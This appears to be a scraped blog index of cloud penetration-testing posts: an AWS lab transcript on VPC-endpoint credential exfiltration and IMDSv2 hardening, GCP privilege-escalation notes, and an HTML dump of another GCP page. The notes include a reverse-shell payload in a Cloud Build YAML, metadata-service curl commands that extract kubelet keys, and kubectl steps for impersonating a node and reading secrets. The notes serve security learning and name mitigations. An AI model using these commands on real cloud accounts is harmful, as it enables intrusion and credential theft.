IP address is 10.0.0.184 and it's running an SSM command and here is another ssm.amazon AWS but we see whatever command we run from within that instance is 10.0.0.184 and not some public IP address that is not that of the ec2 instance that we compromised because of that you're able to successfully bypass this finding of uh credential exfiltration both inside AWS and outside AWS because those simply look at the public IP address but when the cloudtrail only sees Source IP address being that of a private IP address it simply does not know whether that is outside AWS inside AWS or what it is even maybe it's okay and so this begs the question that maybe AWS should create a new guard Duty finding wherein if the source IP address even if it's an internal IP address if it's not equal to the internal IP address of the ec2 instance that you compromised then there should be an additional finding for that if we look at the AWS instances in this current environment I'll use my Cloud goat account this has administrator access on it if we look at this we see the private IP address at 10.0.0.184 this is our sneaky endpoints instance but if we look at the instance for the cloud go we see that it has this private IP address 10.10.10.35 which obviously is not the same as the internal IP address that we just created so this should be a finding that I believe AWS should create to stop this form of a VPC endpoint credential exfiltration additionally if we look at guard duty to see if it picked up on anything we can see that guard Duty says that we don't have any findings let's refresh simply says root credential usage and that is it that this just has to do with using your root account so there's absolutely no findings at all but if we were to run something like AWS STS get Dash caller Dash identity from my specific IP address which is my home IP address let's say that's just profile ec2 breach we see we are given the output of the API call and if we just wait for a couple of minutes we will see that guard Duty picks up on this and alerts the AWS account of this High finding I'll just pause the video and return once guard Duty finds it so I took a little break but uh coming back to guard Duty we look at all the findings uh we see that here are some findings uh IAM root credential usage finding uh that just has to do with using the root account but other than that we see that there's the unauthorized axis IAM user instance credential exfiltration outside AWS and this is the resource resource from which that was ran um there's multiple different uh findings from previous tests that I ran here's one for S an S3 bucket and there's multiple different findings so how do we mitigate this weakness with metadata in this particular scenario well if you recall we were able to Simply curl the metadata service and just like that we were able to get the metadata but if we were to harden the environment we could do the we can configure the metadata such that it uses imds V2 instance metadata service version 2. and what that is is essentially the same thing as instant submitted data service version one which is what we have running right now except it requires that you in addition provide a token header and only once you provide the specific token header then you can actually query the metadata service otherwise you will get an unauthorized or forbidden error message now this token is called X AWS ec2 Dash metadata Dash token using this token you can query the metadata service so to enforce that we can do AWS ec2 modify Dash instance Dash metadata Dash options provide our instance ID which is if you go ec2 describe Dash instances profile Cloud breach no just Cloud goat um and that by the way that was completely instant because I am running a tool called AWS sea lion that simply ran this command from memory because it realized it was a duplicate command that I ran before I'll put a link to that in the description so the instance ID was right here provide this instance ID and then we say HTTP Dash tokens required and HTTP Dash endpoint enabled and before we run this let's look at exactly what the metadata options are for this specific instance so as we can see it says HTTP tokens optional it does not require the AWS ec2 metadata token it says it's optional so let's make it required and provide our profile of cloud go which has administrator access and so now we made it required to use that metadata token so if we run the same command of curling we now get 401 unauthorized and we cannot query the metadata service without having this metadata token so this is exactly what Azure and gcp has by default although there are API there is an API endpoint in gcp that you can query called slash V1 beta this is the original endpoint in the gcp environment and if your client has this enabled you should definitely check it out and make sure that it gets remediated all ec2 instances that are at least publicly available should have imds V2 enabled",
				"image": "/images/cloud_breach_s3_web.png"
		},

    {
      "title"    : "GCP Penetration Testing Notes 2",
      "category" : "",
      "tags"     : "Privesc, Notes, GCP",
      "url"      : "/2022/10/24/GCP-Penetration-Testing-Notes-2/",
      "date"     : "Oct 24, 2022",
      "content"  : " GCP Penetration Testing Notes 2 Privilege Escalation Notes for the following blog post by RhinoSecurityLabs https rhinosecuritylabs com gcp privilege-escalation-google-cloud-platform-part-1 https rhinosecuritylabs com gcp privilege-escalation-google-cloud-platform-part-1 Deployment Manager Privesc using the deploymentmanager deployments create permission Actions Allowed - launch new deployments as the PROJECT NUMBER cloudservices gserviceaccount com service account without needing iam serviceAccounts actAs permission - deployments provided Editor role within project - compute instances create not needed because the cloudservices service account has that permission so you can create a Compute VM - can use a YAML configuration file template to create all kinds of resources - run gcloud deployment-manager types list to see supported resources IAM https rhinosecuritylabs com cloud-security privilege-escalation-google-cloud-platform-part-1 https rhinosecuritylabs com cloud-security privilege-escalation-google-cloud-platform-part-1 Roles Update iam roles update - add permissions to a role you are assigned to Untitled GCP 20Penetration 20Testing 20Notes 202 20e0f928c1a83c48cf919cc74733148fcb Untitled png gcloud iam roles ROLE NAME --project PROJECT NAME --add-permissions PERMISSION Exploit script https github com RhinoSecurityLabs GCP-IAM-Privilege-Escalation blob master ExploitScripts iam roles update py Get Access Token iam serviceAccounts getAccessToken - permission to request access token for a service account - request access token for a higher-privileged service account Exploit script https github com RhinoSecurityLabs GCP-IAM-Privilege-Escalation blob master ExploitScripts iam serviceAccounts getAccessToken py Create Keys iam serviceAccountKeys create - permission to create a key for a service account - create a key as the service account and then authenticate as them gcloud iam service-accounts keys create --iam-account SERVICE ACCOUNT NAME PROJECT iam gserviceaccount com Exploit script https github com RhinoSecurityLabs GCP-IAM-Privilege-Escalation blob master ExploitScripts iam serviceAccountKeys create py Implicit Delegation iam serviceAccounts implicitDelegation If you have this permission on another service account with iam serviceAccounts getAccessToken you can get the access token for another service account through implicit delegation Untitled GCP 20Penetration 20Testing 20Notes 202 20e0f928c1a83c48cf919cc74733148fcb Untitled 201 png Exploit script https github com RhinoSecurityLabs GCP-IAM-Privilege-Escalation blob master ExploitScripts iam serviceAccounts implicitDelegation py Sign Blob iam serviceAccounts signBlob - create a signed blob that retrieves the access token for the targeted service account1 - sign arbitrary payload Exploit Script 1 https github com RhinoSecurityLabs GCP-IAM-Privilege-Escalation blob master ExploitScripts iam serviceAccounts signBlob-accessToken py Exploit Script 2 https github com RhinoSecurityLabs GCP-IAM-Privilege-Escalation blob master ExploitScripts iam serviceAccounts signBlob-gcsSignedUrl py Sign JWT iam serviceAccounts signJwt - sign a JWT and request an access token for the targeted service account Exploit Script https github com RhinoSecurityLabs GCP-IAM-Privilege-Escalation blob master ExploitScripts iam serviceAccounts signJWT py Act As iam serviceAccounts actAs - GCP version of AWS iam PassRole - create a new resource as the targeted service account - the new resource can be a function Compute Engine instance etc Cloud Function Creation - create a cloud function with a higher-privileged service account and then invoke it The following permissions are necessary 1 c https cloudfunctions functions call loudfunctions functions call or cloudfunctions functions setIamPolicy 1 Either immediately invoke a function or set the IAM policy of the function to allow you to invoke it 2 cloudfunctions functions create create new functions 3 cloudfunctions functions sourceCodeSet update function source code 4 iam serviceAccounts actAs Exploit Script 1 https github com RhinoSecurityLabs GCP-IAM-Privilege-Escalation blob master ExploitScripts cloudfunctions functions create-call py Exploit Script 2 https github com RhinoSecurityLabs GCP-IAM-Privilege-Escalation blob master ExploitScripts cloudfunctions functions create-setIamPolicy py Function zip file https github com RhinoSecurityLabs GCP-IAM-Privilege-Escalation tree master ExploitScripts CloudFunctions - zip file is a function that retrieves access token from metadata Cloud Function Update - update an existing function The following permissions are necessary 1 cloudfunctions functions sourceCodeSet 2 cloudfunctions functions update 3 iam serviceAccounts actAs Exploit Script https github com RhinoSecurityLabs GCP-IAM-Privilege-Escalation blob master ExploitScripts cloudfunctions functions update py Compute Instance Create - create a Compute Engine using a high-privileged service account Necessary permissions 1 compute disks create 2 compute instances create 3 compute instances setMetadata 4 compute instances setServiceAccount 5 compute subnetworks use 6 compute subnetworks useExternalIp 7 iam serviceAccounts actAs Exploit Script https github com RhinoSecurityLabs GCP-IAM-Privilege-Escalation blob master ExploitScripts compute instances create py - create instance then exfiltrates creds from metadata to a specified URL and port Create Cloud Run Service - service for building and deploying containerized apps - create new cloud run service invoke it and get the access token from metadata service Necessary permissions 1 run services create 2 run services setIamPolicy or run routes invoke 3 iam serviceaccounts actAs Exploit Script https github com RhinoSecurityLabs GCP-IAM-Privilege-Escalation blob master ExploitScripts run services create py Docker Image https github com RhinoSecurityLabs GCP-IAM-Privilege-Escalation tree master ExploitScripts CloudRunDockerImage Create Cloud Scheduler Job - cloud scheduler is a service for setting up cron jobs - create a cron job that performs some task on the behalf of a higher-privileged service account - e g to create a new storage bucket bash gcloud scheduler jobs create http test --schedule --uri https storage googleapis com storage v1 b project PROJECT-ID --message-body name new-bucket-name --oauth-service-account-email high priv-compute developer gserviceaccount com --headers Content-Type application json Necessary permissions 1 cloudscheduler jobs create 2 cloudscheduler locations list 3 iam serviceAccounts actAs Non-IAM https rhinosecuritylabs com gcp privilege-escalation-google-cloud-platform-part-2 https rhinosecuritylabs com gcp privilege-escalation-google-cloud-platform-part-2 Orgpolicy Set orgpolicy policy set - not a privesc technique but can be used to disable constraints Untitled GCP 20Penetration 20Testing 20Notes 202 20e0f928c1a83c48cf919cc74733148fcb Untitled 202 png Exploit Script https github com RhinoSecurityLabs GCP-IAM-Privilege-Escalation blob master ExploitScripts orgpolicy policy set py Create HMAC Keys storage hmacKeys create - create HMAC key for higher-privileged service account gsutil hmac create SERVICE ACCOUNT - returns access key and secret key Exploit Script https github com RhinoSecurityLabs GCP-IAM-Privilege-Escalation blob master ExploitScripts storage hmacKeys create py Create API Keys serviceusage apiKeys create https cloud google com docs authentication api-keys https cloud google com docs authentication api-keys - When API keys are created they can be used by any entity from anywhere by default - API and application restrictions should be placed on API keys to restrict their usage to only be used by the intentional sources Untitled GCP 20Penetration 20Testing 20Notes 202 20e0f928c1a83c48cf919cc74733148fcb Untitled 203 png Exploit Script https github com RhinoSecurityLabs GCP-IAM-Privilege-Escalation blob master ExploitScripts serviceusage apiKeys create py List API keys serviceusage apiKeys list - list API keys in project gcloud services api-keys list Exploit Script https github com RhinoSecurityLabs GCP-IAM-Privilege-Escalation blob master ExploitScripts serviceusage apiKeys list py Red Flag Permissions Can likely privesc if you have one of the following permissions Permission Description --- --- resourcemanager organizations setIamPolicy Attach IAM role to user in organization resourcemanager folders setIamPolicy Attach IAM role to user in folder resourcemanager projects setIamPolicy Attach IAM role to user in project iam serviceAccounts setIamPolicy Attach IAM role to user at service account level cloudfunctions functions setIamPolicy Change policy of Cloud Function so that it can be invoked setIamPolicy Can update policy for resource asset within environment Google Storage https rhinosecuritylabs com gcp google-cloud-platform-gcp-bucket-enumeration https rhinosecuritylabs com gcp google-cloud-platform-gcp-bucket-enumeration - Google version of AWS S3 - S3 bucket Google Storage bucket - buckets are private by default on creation Enumeration - faster to enumerate buckets by querying the HTTP endpoint than using gsutil - HEAD requests made to https www googleapis com storage v1 b BUCKET NAME endpoint - nonexistent bucket if response is 404 or 400 - public listing of buckets occur when storage objects list is given to allUsers - allUsers means anyone on the internet both authenticated and unauthenticated - permissions on a bucket can be found via the TestIAMPermissions API - https www googleapis com storage v1 b BUCKET NAME iam testPermissions permissions PERMISSION - https www googleapis com storage v1 b BUCKET NAME iam testPermissions permissions storage buckets delete permissions storage buckets get permissions storage buckets getIamPolicy permissions storage buckets setIamPolicy permissions storage buckets update permissions storage objects create permissions storage objects delete permissions storage objects get permissions storage objects list permissions storage objects update - not all permissions will be listed as some are not specific to Google Storage e g resourcemanager projects list - allAuthenticatedUsers is any user on internet that has authenticated to Google Cloud has potential for misconfiguration - From Google https cloud google com iam docs overview https cloud google com iam docs overview Note Consider using allUsers as described on this page rather than allAuthenticatedUsers In many cases granting access to all users is no more of a security risk than granting access only to authenticated users Set Bucket Policy - can privesc to storage admin if you can read the bucket policy storage buckets getIamPolicy and set the IAM policy storage buckets setIamPolicy - storage buckets getIamPolicy is not necessary but otherwise you risk overwriting the original policy could lead to errors in environment Privesc command gsutil ch group YOUR CURRENT GROUP admin gs BUCKET Cloud Build https rhinosecuritylabs com gcp iam-privilege-escalation-gcp-cloudbuild https rhinosecuritylabs com gcp iam-privilege-escalation-gcp-cloudbuild 1 Provide code for Cloud Build which gets executed during build process RCE 2 Get access token for cloudbuild service account - must have permission to start a new build to escalate privileges cloudbuild builds create Exploit Script https github com RhinoSecurityLabs GCP-IAM-Privilege-Escalation blob master ExploitScripts cloudbuild builds create py Methodology - create malicious yaml file yaml steps - name python entrypoint python args - -c - import socket subprocess os s socket socket socket AF INET socket SOCK STREAM s connect IP-ADDRESS PORT os dup2 s fileno 0 os dup2 s fileno 1 os dup2 s fileno 2 p subprocess call bin sh -i Run the following command gcloud builds submit --config build yaml Then read root tokencache gsutil token cache to get Cloud Build service account token - check scope of token here https www googleapis com oauth2 v3 tokeninfo access token Remediation - don t provide cloudbuild build create unless you re okay with the permissions the Cloud Build service account grants - consider reducing the permissions for the CloudBuild service account GKE https www 4armed com blog hacking-kubelet-on-gke https www 4armed com blog hacking-kubelet-on-gke https rhinosecuritylabs com cloud-security kubelet-tls-bootstrap-privilege-escalation https rhinosecuritylabs com cloud-security kubelet-tls-bootstrap-privilege-escalation Kubernetes Threat Matrix https www microsoft com en-us security blog 2020 04 02 attack-matrix-kubernetes https www microsoft com en-us security blog 2020 04 02 attack-matrix-kubernetes Untitled GCP 20Penetration 20Testing 20Notes 202 20e0f928c1a83c48cf919cc74733148fcb Untitled 204 png Kubelet Retrieve apiserver crt kubelet crt and kubelet key bash curl -s -H Metadata-Flavor Google http metadata google internal computeMetadata v1 instance attributes kube-env grep KUBELET CERT awk print 2 base64 -d kubelet crt curl -s -H Metadata-Flavor Google http metadata google internal computeMetadata v1 instance attributes kube-env grep KUBELET KEY awk print 2 base64 -d kubelet key curl -s -H Metadata-Flavor Google http metadata google internal computeMetadata v1 instance attributes kube-env grep CA CERT awk print 2 base64 -d apiserver crt - use KUBERNETES PORT 443 TCP ADDR env variable to find Kubernetes master IP address TLS Bootstrapping TLS bootstrap privesc steps Untitled GCP 20Penetration 20Testing 20Notes 202 20e0f928c1a83c48cf919cc74733148fcb Untitled 205 png - creds give permissions to the CertificateSigningRequest object List certificate signing request CSRs for cluster nodes bash kubectl --client-certificate kubelet crt --client-key kubelet key --certificate-authority apiserver crt --server https KUBERNETES PORT 443 TCP ADDR get certificatesigningrequests Obtain client certificate that kubelet uses for its normal functions bash kubectl --client-certificate kubelet crt --client-key kubelet key --certificate-authority apiserver crt --server https KUBERNETES PORT 443 TCP ADDR get certificatesigningrequests NODE NAME -o yaml - in the output of this command the certificate is in the status certificate field base64 encoded Base64 decode client certificate bash kubectl --client-certificate kubelet crt --client-key kubelet key --certificate-authority apiserver crt --server https KUBERNETES PORT 443 TCP ADDR get certificatesigningrequests NODE NAME -o jsonpath status certificate base64 -d node crt - cannot yet get pod with client certificate cause the private key rotates every time before a new CSR is created using LoadOrGenerateKeyFile function - must create own key generate CSR and submit the CSR and key Become a Node Create private key bash openssl req -nodes -newkey rsa 2048 -keyout k8shack key -out k8shack csr -subj O system nodes CN system node NODE NAME - note that you can specify the node name and it will work because Kubernetes has no restrictions for which certificates a node can request Submit key to API bash cat EOF kubectl --client-certificate kubelet crt --client-key kubelet key --certificate-authority apiserver crt --server https KUBERNETES PORT 443 TCP ADDR create -f - apiVersion certificates k8s io v1beta1 kind CertificateSigningRequest metadata name node-csr- date s spec groups - system nodes request cat k8shack csr base64 tr -d n usages - digital signature - key encipherment - client auth EOF Get pod bash kubectl --client-certificate kubelet crt --client-key kubelet key --certificate-authority apiserver crt --server https KUBERNETES PORT 443 TCP ADDR get csr NODE NAME Get certificate bash kubectl --client-certificate kubelet crt --client-key kubelet key --certificate-authority apiserver crt --server https KUBERNETES PORT 443 TCP ADDR get csr NODE NAME -o jsonpath status certificate base64 -d node2 crt Access API server bash kubectl --client-certificate node2 crt --client-key k8shack key --certificate-authority apiserver crt --server https KUBERNETES PORT 443 TCP ADDR get pods -o wide - following the steps above provide access to API as system nodes group - system nodes group allows pod scheduling and viewing secrets - note that you can get secrets but you can t list them - secret names can be found from pod spec bash kubectl --client-certificate node2 crt --client-key k8shack key --certificate-authority apiserver crt --server https KUBERNETES PORT 443 TCP ADDR get pod POD NAME -o yaml Get secret bash kubectl --client-certificate node2 crt --client-key k8shack key --certificate-authority apiserver crt --server https KUBERNETES PORT 443 TCP ADDR get secret SECRET NAME -o yaml - secret is base64 encoded - if the secret contains a token you can use it in kubectl with the --token flag for example bash kubectl --certificate-authority ca crt --token TOKEN --server https MASTER IP get all - check if you can access other pods using exec Service Account Token Service account token in one of the following locations var run secrets kubernetes io serviceaccount token or run secrets kubernetes io serviceaccount token Mitigations Metadata Concealment - hide kube-env value see the official Google Cloud document https cloud google com kubernetes-engine docs how-to protecting-cluster-metadata for Kubernetes metadata protection - use --workload-metadata-from-node SECURE to conceal metadata - will return This metada endpoint is concelead when querying http metadata google internal computeMetadata v1 instance attributes kube-env Network Policy - deny egress by default whitelist only necessary egress traffic - applied to pods since - block metadata service if not needed Other Mitigations 1 Service mesh with egress gateway 1 prevent communication from containers to unauthorized hosts 2 Restrict network access to masters 1 Create private cluster with public access disabled and use jumpbox in VPC to access API Tools GCP-IAM-Privesc https github com RhinoSecurityLabs GCP-IAM-Privilege-Escalation - contains privesc scanners and exploits to automate exploitation GCP Bucket Brute https github com RhinoSecurityLabs GCPBucketBrute - enumerates buckets to see if they can be accessed or used for privilege escalation GCP IAM Collector https github com marcin-kolda gcp-iam-collector - provides visualization graph for IAM permissions in GCP environment Kubeletemein https github com 4armed kubeletmein - Kubernetes abuse - reads metadata instance attributes generates CSRs and submits them to the API and writes out a kubeconfig file for use with kubectl",
				"image": "/images/GCP-Penetration-Testing-Notes-2.jpg"
		},

    {
      "title"    : "GCP Penetration Testing Notes",
      "category" : "",
      "tags"     : "Privesc, Notes, GCP",
      "url"      : "/2022/10/01/GCP-Penetration-Testing-Notes/",
      "date"     : "Oct 01, 2022",
      "content"  : " html head meta http equiv Content Type content text html charset utf title GCP Penetration Testing title style   cspell disable file   webkit printing magic print all background colors  html   webkit print color adjust exact       box sizing border box   webkit print color adjust exact     html  body   margin   padding     media only screen   body   margin em auto   max width px   color rgb       body   line height   white space pre wrap     a  a visited   color inherit   text decoration underline      pdf relative link path   font size   color     h  h  h   letter spacing em   line height   font weight   margin bottom      page title   font size rem   font weight   margin top   margin bottom em     h   font size rem   margin top rem     h   font size rem   margin top rem     h   font size rem   margin top rem      source   border px solid ddd   border radius px   padding em   word break break all      callout   border radius px   padding rem     figure   margin em   page break inside avoid     figcaption   opacity   font size   margin top em     mark   background color transparent      indented   padding left em     hr   background transparent   display block   width   height px   visibility visible   border none   border bottom px solid rgba     img   max width      media only print   img   max height vh   object fit contain        page   margin in      collection content   font size rem      column list   display flex   justify content space between      column   padding em      column first child   padding left      column last child   padding right      table of contents item   display block   font size rem   line height   padding rem      table of contents indent   margin left rem      table of contents indent   margin left rem      table of contents indent   margin left rem      table of contents link   text decoration none   opacity   border bottom px solid rgba     table  th  td   border px solid rgba   border collapse collapse     table   border left none   border right none     th  td   font weight normal   padding em em   line height   min height em   text align left     th   color rgba     ol  ul   margin   margin block start em   margin block end em     li ol first child  li ul first child   margin block start em     ul li   list style disc     ul to do list   text indent em     ul to do list li   list style none      to do children checked   text decoration line through   opacity     ul toggle li   list style none     ul   padding inline start em     ul li   padding left em     ol   padding inline start em     ol li   padding left em      mono ol   padding inline start em      mono ol li   text indent em      toggle   padding inline start em   list style type none      Indent toggle children   toggle li details   padding left em      toggle li details summary   margin left em      selected value   display inline block   padding em   background rgba   border radius px   margin right em   margin top em   margin bottom em   white space nowrap      collection title   display inline block   margin right em      simple table   margin top em   font size rem   empty cells show     simple table td   height px   min width px      simple table th   height px   min width px      simple table header color   background rgb   color black     simple table header   font weight     time   opacity      icon   display inline block   max width em   max height em   text decoration none   vertical align text bottom   margin right em     img icon   border radius px      user icon   width em   height em   border radius   margin right rem      user icon inner   font size em      text icon   border px solid   text align center      page cover image   display block   object fit cover   width   max height vh      page header icon   font size rem   margin bottom rem      page header icon with cover   margin top em   margin left em      page header icon img   border radius px      link to page   margin em   padding   border none   font weight     p user   opacity     td user  td time   white space nowrap     input type checkbox   transform scale   margin right em   vertical align middle     p   margin top em   margin bottom em      image   border none   margin em   padding   border radius   text align center      code  code   background rgba   border radius px   padding em em   border radius px   font size   tab size     code   color eb      code   padding em em      code wrap   white space pre wrap   word break break all      code code   background none   padding   font size   color inherit     blockquote   font size em   margin em   padding left em   border left px solid rgb      bookmark   text decoration none   max height em   padding   display flex   width   align items stretch      bookmark title   font size em   overflow hidden   text overflow ellipsis   height em   white space nowrap      bookmark text   display flex   flex direction column      bookmark info   flex px   padding px px px   display flex   flex direction column   justify content space between      bookmark image   width   flex px   display block   position relative   object fit cover   border radius px      bookmark description   color rgba   font size em   overflow hidden   max height em   word break break word      bookmark href   font size em   margin top em      sans font family ui sans serif apple system BlinkMacSystemFont Segoe UI Helvetica Apple Color Emoji Arial sans serif Segoe UI Emoji Segoe UI Symbol   code font family SFMono Regular Menlo Consolas PT Mono Liberation Mono Courier monospace   serif font family Lyon Text Georgia ui serif serif   mono font family iawriter mono Nitti Menlo Courier monospace   pdf sans font family Inter ui sans serif apple system BlinkMacSystemFont Segoe UI Helvetica Apple Color Emoji Arial sans serif Segoe UI Emoji Segoe UI Symbol 'Twemoji' 'Noto Color Emoji' 'Noto Sans CJK JP'   pdf lang zh CN sans font family Inter ui sans serif apple system BlinkMacSystemFont Segoe UI Helvetica Apple Color Emoji Arial sans serif Segoe UI Emoji Segoe UI Symbol 'Twemoji' 'Noto Color Emoji' 'Noto Sans CJK SC'   pdf lang zh TW sans font family Inter ui sans serif apple system BlinkMacSystemFont Segoe UI Helvetica Apple Color Emoji Arial sans serif Segoe UI Emoji Segoe UI Symbol 'Twemoji' 'Noto Color Emoji' 'Noto Sans CJK TC'   pdf lang ko KR sans font family Inter ui sans serif apple system BlinkMacSystemFont Segoe UI Helvetica Apple Color Emoji Arial sans serif Segoe UI Emoji Segoe UI Symbol 'Twemoji' 'Noto Color Emoji' 'Noto Sans CJK KR'   pdf code font family Source Code Pro SFMono Regular Menlo Consolas PT Mono Liberation Mono Courier monospace 'Twemoji' 'Noto Color Emoji' 'Noto Sans Mono CJK JP'   pdf lang zh CN code font family Source Code Pro SFMono Regular Menlo Consolas PT Mono Liberation Mono Courier monospace 'Twemoji' 'Noto Color Emoji' 'Noto Sans Mono CJK SC'   pdf lang zh TW code font family Source Code Pro SFMono Regular Menlo Consolas PT Mono Liberation Mono Courier monospace 'Twemoji' 'Noto Color Emoji' 'Noto Sans Mono CJK TC'   pdf lang ko KR code font family Source Code Pro SFMono Regular Menlo Consolas PT Mono Liberation Mono Courier monospace 'Twemoji' 'Noto Color Emoji' 'Noto Sans Mono CJK KR'   pdf serif font family PT Serif Lyon Text Georgia ui serif serif 'Twemoji' 'Noto Color Emoji' 'Noto Serif CJK JP'   pdf lang zh CN serif font family PT Serif Lyon Text Georgia ui serif serif 'Twemoji' 'Noto Color Emoji' 'Noto Serif CJK SC'   pdf lang zh TW serif font family PT Serif Lyon Text Georgia ui serif serif 'Twemoji' 'Noto Color Emoji' 'Noto Serif CJK TC'   pdf lang ko KR serif font family PT Serif Lyon Text Georgia ui serif serif 'Twemoji' 'Noto Color Emoji' 'Noto Serif CJK KR'   pdf mono font family PT Mono iawriter mono Nitti Menlo Courier monospace 'Twemoji' 'Noto Color Emoji' 'Noto Sans Mono CJK JP'   pdf lang zh CN mono font family PT Mono iawriter mono Nitti Menlo Courier monospace 'Twemoji' 'Noto Color Emoji' 'Noto Sans Mono CJK SC'   pdf lang zh TW mono font family PT Mono iawriter mono Nitti Menlo Courier monospace 'Twemoji' 'Noto Color Emoji' 'Noto Sans Mono CJK TC'   pdf lang ko KR mono font family PT Mono iawriter mono Nitti Menlo Courier monospace 'Twemoji' 'Noto Color Emoji' 'Noto Sans Mono CJK KR'   highlight default   color rgba     highlight gray   color rgba   fill rgba     highlight brown   color rgba   fill rgba     highlight orange   color rgba   fill rgba     highlight yellow   color rgba   fill rgba     highlight teal   color rgba   fill rgba     highlight blue   color rgba   fill rgba     highlight purple   color rgba   fill rgba     highlight pink   color rgba   fill rgba     highlight red   color rgba   fill rgba     highlight gray background   background rgba     highlight brown background   background rgba     highlight orange background   background rgba     highlight yellow background   background rgba     highlight teal background   background rgba     highlight blue background   background rgba     highlight purple background   background rgba     highlight pink background   background rgba     highlight red background   background rgba     block color default   color inherit   fill inherit     block color gray   color rgba   fill rgba     block color brown   color rgba   fill rgba     block color orange   color rgba   fill rgba     block color yellow   color rgba   fill rgba     block color teal   color rgba   fill rgba     block color blue   color rgba   fill rgba     block color purple   color rgba   fill rgba     block color pink   color rgba   fill rgba     block color red   color rgba   fill rgba     block color gray background   background rgba     block color brown background   background rgba     block color orange background   background rgba     block color yellow background   background rgba     block color teal background   background rgba     block color blue background   background rgba     block color purple background   background rgba     block color pink background   background rgba     block color red background   background rgba     select value color pink background color rgba   select value color purple background color rgba   select value color green background color rgba   select value color gray background color rgba   select value color opaquegray background color rgba   select value color orange background color rgba   select value color brown background color rgba   select value color red background color rgba   select value color yellow background color rgba   select value color blue background color rgba    checkbox   display inline flex   vertical align text bottom   width   height   background size px   margin left px   margin right px      checkbox on   background image url data image svg xml charset UTF Csvg width D height D viewBox D fill D none xmlns D http A F Fwww w org F Fsvg E A Crect width D height D fill D A D F E A Cpath d D M L L L L L L Z fill D white F E A C Fsvg E      checkbox off   background image url data image svg xml charset UTF Csvg width D height D viewBox D fill D none xmlns D http A F Fwww w org F Fsvg E A Crect x D y D width D height D fill D white stroke D F stroke width D F E A C Fsvg E       style head body article id e bf e fa c ba eeac c class page sans header h class page title GCP Penetration Testing h header div class page body nav id dec f e fce e aeb ba f class block color gray table of contents div class table of contents item table of contents indent a class table of contents link href b bb d d bf ac a Privesc and Post Exploitation in GCP by strong Chris Moberly strong a div div class table of contents item table of contents indent a class table of contents link href deb e b f a ccbdda GCP Fundamentals a div div class table of contents item table of contents indent a class table of contents link href d c b e c c b a f fdda dd c Service Accounts a div div class table of contents item table of contents indent a class table of contents link href bc a de d e a aca a Access Scopes a div div class table of contents item table of contents indent a class table of contents link href fae f a a d fac cfc b IAM a div div class table of contents item table of contents indent a class table of contents link href d a e e b b b d af fc fe Enumeration a div div class table of contents item table of contents indent a class table of contents link href d bafd db a fa e a ddd Application Default Credentials a div div class table of contents item table of contents indent a class table of contents link href cd d a aa f e e Service Account Token a div div class table of contents item table of contents indent a class table of contents link href beade d a b ef Application Default Credentials a div div class table of contents item table of contents indent a class table of contents link href a a f e c e f d be Privilege Escalation a div div class table of contents item table of contents indent a class table of contents link href a a b ad f a bea b d a a SSRF a div div class table of contents item table of contents indent a class table of contents link href ec b bd b e ba f abfdd Insecure Metadata Endpoint a div div class table of contents item table of contents indent a class table of contents link href e a e dab e a b fd af Compute Instances a div div class table of contents item table of contents indent a class table of contents link href a f a babb c e a a General a div div class table of contents item table of contents indent a class table of contents link href d d bbaf c e ecabe a Modifying Instance Metadata a div div class table of contents item table of contents indent a class table of contents link href bd db b a f b f c ddcf d Bypassing Access Scopes a div div class table of contents item table of contents indent a class table of contents link href c afa c f da b aae a e fd Steal GCloud Authorizations a div div class table of contents item table of contents indent a class table of contents link href e f fc f b e b ac f ee d d Service Account Impersonation a div div class table of contents item table of contents indent a class table of contents link href aecfdcf ac fce a fe b c a Accessing Databases a div div class table of contents item table of contents indent a class table of contents link href dfe ef ff a b a e b b Storage Buckets a div div class table of contents item table of contents indent a class table of contents link href e f fb eb b b fae Decrypting Secrets a div div class table of contents item table of contents indent a class table of contents link href dae a a c c c a ab c Enumeration a div div class table of contents item table of contents indent a class table of contents link href b dfdcd b be b cde a Serial Console Logs a div div class table of contents item table of contents indent a class table of contents link href e e dd b bf b d Custom Images a div div class table of contents item table of contents indent a class table of contents link href bf e b a a bf a df bf e Custom Templates a div div class table of contents item table of contents indent a class table of contents link href fea e c e e a a a d fa StackDriver Logging a div div class table of contents item table of contents indent a class table of contents link href be d b fcb d a fc cc Serverless Services a div div class table of contents item table of contents indent a class table of contents link href da fb cb bd bd aa fa Cloud Functions a div div class table of contents item table of contents indent a class table of contents link href a c c b d ab App Engine a div div class table of contents item table of contents indent a class table of contents link href bd ba d bbda b a cebd c Cloud Run a div div class table of contents item table of contents indent a class table of contents link href f cbd f a a f bbd fc e AI Platform a div div class table of contents item table of contents indent a class table of contents link href e c e b a d dfac Cloud Pub Sub a div div class table of contents item table of contents indent a class table of contents link href cc ada a bd cb ef ca Cloud Source Repos a div div class table of contents item table of contents indent a class table of contents link href c c c ff b b f a a Cloud Filestore a div div class table of contents item table of contents indent a class table of contents link href e f d aa d e a a eda beffb Kubernetes a div div class table of contents item table of contents indent a class table of contents link href f c d e a d ef f Secrets Management a div div class table of contents item table of contents indent a class table of contents link href dfd ccbc f d ae a fce b b b Local System Secrets a div div class table of contents item table of contents indent a class table of contents link href f e e c d ad c f e Networking a div div class table of contents item table of contents indent a class table of contents link href e e de beee c d c Firewall a div div class table of contents item table of contents indent a class table of contents link href e fc e c bb d ee b f Enumeration a div div class table of contents item table of contents indent a class table of contents link href f ef b a d b c G Suite a div div class table of contents item table of contents indent a class table of contents link href f bce ad b dc a d aee Authenticating to G Suite a div div class table of contents item table of contents indent a class table of contents link href bc a ee b d c bd d f Tools a div nav h id b bb d d bf ac a class Privesc and Post Exploitation in GCP by strong Chris Moberly strong h p id eef a f a ab c cc dc c d class a href https about gitlab com blog plundering gcp escalating privileges in google cloud platform https about gitlab com blog plundering gcp escalating privileges in google cloud platform a p p id a d ac d f a a d a class   p h id deb e b f a ccbdda class GCP Fundamentals h ul id b e d b b d c class bulleted list li style list style type disc raw HTTP API call for a given code gcloud code command can be found by appending code log http code to the command li ul p id f df f a d df af f ac class strong Recursively enumerate an instance s metadata strong p pre id ccf d e ad c be f d d dad ec class code code curl quot http metadata google internal computeMetadata v recursive true amp alt text quot H quot Metadata Flavor Google quot   code pre ul id f db e ed d a b c bf b class bulleted list li style list style type disc you may find some juicy information in the metadata including private SSH keys li ul p id f e e ff b ac fcef adc class   p ul id a c c e f a e c e b class bulleted list li style list style type disc GCP uses a resource hierarchy ul id f bc d a aeb ae a class bulleted list li style list style type circle similar to traditional filesystem structure li ul pre id a e cf a bb c af class code code Organization  gt Folders  gt Projects  gt Resources code pre ul id e e fc d af d aed c class bulleted list li style list style type circle therefore if a user has a certain permission to an organization that permission gets propagated to folders projects and resources li ul li ul h id d c b e c c b a f fdda dd c 